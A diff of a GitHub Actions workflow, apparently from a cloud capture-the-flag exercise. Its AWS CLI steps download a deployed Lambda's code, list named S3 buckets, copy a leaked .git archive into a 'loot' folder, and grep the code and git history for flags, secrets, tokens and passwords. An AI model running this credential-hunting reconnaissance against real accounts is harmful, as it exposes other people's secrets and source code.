@@ -24,71 +24,69 @@ jobs:
         run: |
           aws sts get-caller-identity
 
-      - name: Lambda configuration
+      - name: Lambda info
         run: |
           echo "===== LAMBDA CONFIG ====="
-
           aws lambda get-function-configuration \
             --function-name nslookupv2
 
-      - name: Download deployed Lambda code
-        run: |
           echo "===== DOWNLOAD LAMBDA ====="
+          mkdir -p lambda_code
 
           aws lambda get-function \
             --function-name nslookupv2 \
             --query 'Code.Location' \
-            --output text > lambda_url.txt
+            --output text > lambda_url
 
-          curl -L -o lambda.zip "$(cat lambda_url.txt)"
+          curl -s $(cat lambda_url) -o lambda.zip
 
-          mkdir lambda_code
-          unzip lambda.zip -d lambda_code
+          unzip -o lambda.zip -d lambda_code
 
           echo "===== FILES ====="
           find lambda_code -type f
 
           echo "===== SEARCH ====="
-          grep -RniE \
-          "flag|secret|key|token|password|s3|subprocess|os|eval|exec|open" \
-          lambda_code || true
+          grep -RniE "flag|secret|key|token|password|s3|aws|lambda|http" lambda_code || true
 
-      - name: Export API Gateway
-        run: |
-          echo "===== API GATEWAY ====="
-
-          aws apigateway get-export \
-            --rest-api-id 3q931syi7b \
-            --stage-name dev \
-            --export-type oas30 \
-            api.json
-
-          cat api.json
 
       - name: S3 discovery
         run: |
           echo "===== BUCKETS ====="
-
           aws s3 ls
 
-          echo "===== PLATFORM BUCKET ====="
+          echo "===== PLATFORM ====="
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ || true
 
-          aws s3 ls \
-          s3://platform-bucket-009661764077-us-east-1/
+          echo "===== SITE ====="
+          aws s3 ls s3://site781fe43f26b9eba3/ || true
 
-          echo "===== DOTGIT ====="
+
+      - name: Download leaked git
+        run: |
+          mkdir -p loot
 
           aws s3 cp \
           s3://platform-bucket-009661764077-us-east-1/dotgit.zip \
-          dotgit.zip
+          loot/dotgit.zip
 
-          unzip -l dotgit.zip
+          unzip -o loot/dotgit.zip -d loot/dotgit
+
+          echo "===== GIT FILES ====="
+          find loot/dotgit/.git -type f | head
+
+          echo "===== SEARCH GIT HISTORY ====="
+          cd loot/dotgit
+
+          git log --all --stat
+
+          git grep -nEi "flag|secret|key|token|password|aws|lambda|s3|api" $(git rev-list --all) || true
+
 
       - name: CloudFront
         run: |
           echo "===== CLOUDFRONT ====="
+          aws cloudfront list-distributions || true
 
-          aws cloudfront list-distributions
 
       - name: Test API
         run: |
